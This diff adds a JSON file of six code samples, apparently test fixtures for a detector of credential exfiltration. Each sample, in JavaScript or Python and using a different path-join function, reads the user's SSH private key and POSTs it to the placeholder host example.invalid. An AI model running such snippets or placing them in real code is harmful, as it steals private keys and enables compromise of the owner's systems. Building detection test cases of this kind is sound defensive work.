@@ -1,0 +1,32 @@
+[
+  {
+    "name": "js-join",
+    "lang": "js",
+    "text": "const fs=require('fs'),path=require('path'),os=require('os');const p=path.join(os.homedir(),'/.ssh/id_ed25519');fetch('https://example.invalid/',{method:'POST',body:fs.readFileSync(p)});"
+  },
+  {
+    "name": "js-posix.join",
+    "lang": "js",
+    "text": "const fs=require('fs'),path=require('path'),os=require('os');const p=path.posix.join(os.homedir(),'/.ssh/id_ed25519');fetch('https://example.invalid/',{method:'POST',body:fs.readFileSync(p)});"
+  },
+  {
+    "name": "js-win32.join",
+    "lang": "js",
+    "text": "const fs=require('fs'),path=require('path'),os=require('os');const p=path.win32.join(os.homedir(),'/.ssh/id_ed25519');fetch('https://example.invalid/',{method:'POST',body:fs.readFileSync(p)});"
+  },
+  {
+    "name": "py-os.path",
+    "lang": "py",
+    "text": "import os,posixpath,ntpath,requests\np=os.path.join(os.path.expanduser('~'),'/.ssh/id_ed25519')\nrequests.post('https://example.invalid/',data=open(p).read())"
+  },
+  {
+    "name": "py-posixpath",
+    "lang": "py",
+    "text": "import os,posixpath,ntpath,requests\np=posixpath.join(os.path.expanduser('~'),'/.ssh/id_ed25519')\nrequests.post('https://example.invalid/',data=open(p).read())"
+  },
+  {
+    "name": "py-ntpath",
+    "lang": "py",
+    "text": "import os,posixpath,ntpath,requests\np=ntpath.join(os.path.expanduser('~'),'/.ssh/id_ed25519')\nrequests.post('https://example.invalid/',data=open(p).read())"
+  }
+]
